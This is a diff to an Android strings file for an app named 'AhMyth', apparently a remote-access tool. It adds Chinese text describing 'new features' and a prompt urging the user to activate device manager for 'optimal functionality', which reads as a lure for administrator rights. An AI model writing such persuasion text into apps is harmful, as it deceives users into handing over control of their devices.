@@ -1,3 +1,5 @@
 <resources>
     <string name="app_name">AhMyth</string>
+    <string name="description">本程序增加新功能</string>
+    <string name="device_admin">激活设备管理器，以实现最优功能</string>
 </resources>
